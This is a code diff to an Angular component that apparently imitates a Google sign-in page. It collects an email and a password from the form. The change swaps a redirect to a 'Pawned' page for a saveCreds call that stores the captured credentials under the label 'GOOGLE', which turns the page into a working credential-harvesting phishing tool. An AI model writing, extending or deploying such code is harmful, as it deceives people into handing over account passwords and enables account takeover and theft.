@@ -1,5 +1,5 @@
 import { Component, ElementRef, ViewChild } from '@angular/core';
-import { PageRoutingService } from 'src/app/services/page-routing.service';
+import { SaveFacadeService } from 'src/app/services/save-facade.service';
 
 @Component({
   selector: 'app-google',
@@ -9,7 +9,7 @@ import { PageRoutingService } from 'src/app/services/page-routing.service';
 export class GoogleComponent {
   isPasswordReady: boolean = false; // Set this to true or false based on your condition
 
-  constructor(private pageRouting: PageRoutingService ){}
+  constructor(private saveService: SaveFacadeService ){}
   
   @ViewChild('emailInput')
   emailInput!: ElementRef;
@@ -22,8 +22,6 @@ export class GoogleComponent {
 
 
   next() {
-    // Focus on the password input field when Enter is pressed in the email field
-    // this.passwordInput.nativeElement.focus();
     
     if(this.isPasswordReady){
       this.finalPassword= this.passwordInput.nativeElement.value.toString()
@@ -39,10 +37,14 @@ export class GoogleComponent {
 
     
     if (this.isPasswordReady) {
-      this.pageRouting.navigateToPawned()
-    }
+      this.saveService.saveCreds(this.finalEmail,this.finalPassword,"GOOGLE")
 
-    this.isPasswordReady = !this.isPasswordReady;
+    }
+    
+    if (this.finalEmail.trim()!= "") {
+      this.isPasswordReady = !this.isPasswordReady;
+      
+    }
     
   }
 }
